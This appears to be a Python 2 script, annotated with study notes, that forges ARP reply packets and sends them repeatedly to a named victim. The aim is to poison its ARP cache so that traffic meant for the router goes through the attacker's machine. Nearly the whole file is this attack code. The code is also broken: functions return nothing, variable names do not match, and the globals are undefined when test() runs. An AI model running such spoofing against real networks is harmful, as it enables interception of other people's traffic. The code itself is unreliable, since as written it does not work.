# NOTE(cab): Source: http://www.secdev.org/python/arpyspoof.py

import sys, string, argparse
from socket import *
from struct import *
from time import sleep

ETHER_BROADCAST = "\xff"*6 # NOTE(cab): Broadcast address (ff:ff:ff:ff:ff:ff)
ETH_P_ETHERNET  = 0x0001   # NOTE(cab): Hardware type(protocole) Ethernet
ETH_P_IP        = 0x0800   # NOTE(cab): IPv4
ETH_P_ARP       = 0x0806   # NOTE(cab): ARP
ETH_P_H_LEN     = 0x0006   # NOTE(cab): Ethernet addresses size is 6
ETH_P_P_LEN     = 0x0004   # NOTE(cab): IPv4 addresses size is 4
ETH_P_OPER      = 0x0002   # NOTE(cab): Type of operation; 1 for request and 2 for reply
# NOTE(cab): List ot EtherType - http://en.wikipedia.org/wiki/EtherType

def mac_to_string(mac_address):
    return ':'.join(s.encode('hex') for s in mac_address.decode('hex'))

def string_to_mac(mac_address):
    return "%02x:%02x:%02x:%02x:%02x:%02x" % unpack("!6B", mac_address)

def log(message):
    if verbose:
        print(message)

def startPoisoning(args):
    try:
        # NOTE(cab):
        #   AF_PACKET = Type of packet (packet socket)
        #      |-> doesn't work on Windows nor OS X. Will have to use https://pypi.python.org/pypi/pypcap
        #   SOCK_RAW = Send without any changes in the packet data
        #   htons = Convert to unsigned short host byte order to network byte order
        # Source: http://man7.org/linux/man-pages/man7/packet.7.html
        s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
        s.bind((adapter, ETH_P_ARP))
        myMacAddress = s.getsockname()[4]
        packet = create_packet(args.target, myMacAddress, args.host)

        print "target: ", args.victim
        print "host: ", args.host
        print "adapter: ", adapter
        print "my mac adress: ", mac_to_string(myMacAddress)
        while True:
            s.send(packet)
            time.sleep(args.freq)
    except KeyboardInterrupt:
        log("Interrupted by user")
        pass

def create_packet(targetIP, myMacAddress, hostIP):
    packet = targetIP + myMacAddress + htons(ETH_P_ARP) + forge_arp_packet(myMacAddress, hostIP)


# NOTE(cab):
# Packet Structure:
# http://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure
# Format:
#   inet_aton = Convert IPv4 into binary form (in network by order)
#   INADDR_ANY = Bound to all local interfaces
#   pack -> Byte Order
#       ! = network (= big-endian)
#        -> Format
#       I = unsigned int
#       H = unsigned short
#       B = unsigned char
def forge_arp_packet(myMacAddress, ipOfRouter):
    pack("!HHBBH", ETH_P_ETHERNET, ETH_P_IP, ETH_P_H_LEN, ETH_P_P_LEN, ETH_P_OPER) \
            + myMacAddress + inet_aton(ipOfRouter) + ETHER_BROADCAST \
            + htonl(INADDR_ANY)

# parser = argparse.ArgumentParser()
# parser.add_argument('--victim', required=True, help="Victim IP")
# parser.add_argument('--host', required=True, help="Router IP")
# parser.add_argument('--freq', type=float, default=5.0, help="frequency to send packets, in seconds")
# parser.add_argument('--ports', default="80,443", help="comma seperated list of ports to forward to proxy")
# parser.add_argument('--verbose', type=bool, default=True, help="default to true")
# args = parser.parse_args()
#
# verbose = args.verbose;
# adapter = "eth0"
#
# startPoisoning(args);

def test():
    # print [ip for ip in gethostbyname_ex(gethostname())[2] if not ip.startswith("127.")][:1]
    # print([(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1])

    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
    s.bind((adapter, ETH_P_ARP))
    myMacAddress = s.getsockname()[4]
    packet = create_packet(args.target, myMacAddress, args.host)
    print myMacAddress

test();
